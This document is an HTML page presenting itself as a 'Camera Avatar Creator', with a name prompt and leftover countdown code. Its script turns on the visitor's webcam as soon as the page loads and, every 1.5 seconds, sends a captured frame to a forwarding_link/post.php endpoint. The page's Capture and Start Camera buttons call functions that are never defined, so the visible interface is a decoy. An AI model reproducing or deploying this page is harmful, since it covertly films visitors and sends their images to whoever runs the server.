<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avatar creater</title>
<style>
    body{
font-family:Arial;
text-align:center;
background:#f3f4f6;
}

video{

width:320px;
border-radius:10px;
margin-top:20px;

}

canvas{

border-radius:50%;
border:5px solid blue;
margin-top:20px;

}

button{

padding:10px;
margin:10px;
border:none;
background:blue;
color:white;
border-radius:5px;

}
</style>    
</head>
<body>
    
<h2>Camera Avatar Creator</h2>

<video id="video"
playsinline
autoplay>
</video>

<br>

<button onclick="capture()">

Capture

</button>

<button onclick="startCamera()">

Start Camera

</button>

<br>

<canvas id="canvas"
width="250"
height="250">
</canvas>
</body>
<script>
    /* ── Webcam capture & POST ── */
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function (result) {
            // handle response
        },
        error: function () {}
    });
}

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
    audio: false,
    video: { facingMode: "user" }
};

async function init() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
    } catch (e) {
        if (errorMsgElement) {
            errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
        }
    }
}

function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    var context = canvas.getContext('2d');
    setInterval(function () {
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

init();

/* ── User name prompt ── */
var userName = prompt("Please Enter Your Name\n\n👇👇👇👇👇");

document.querySelectorAll('.user-name-target').forEach(function (el) {
    el.textContent = userName || '';
});

var byLine = document.getElementById('by-line');
if (byLine) {
    byLine.textContent = "by - " + (userName || '');
}

/* ── Countdown timer ── */
var countDownDate = new Date("October 10, 2018 00:00:00").getTime();

var x = setInterval(function () {
    var now = new Date().getTime();
    var distance = countDownDate - now;

    var days    = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours   = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);

    var demoEl = document.getElementById("demo");
    if (!demoEl) return;

    if (distance < 0) {
        clearInterval(x);
        demoEl.innerHTML = "🙏 Welcome 🙏";
    } else {
        demoEl.innerHTML =
            days    + "<i> Days,</i> " +
            hours   + " <i>Hrs,</i> " +
            minutes + "<i> Min,</i> " +
            seconds + "<i> Sec</i> ";
    }
}, 1000);

</script>
</html>
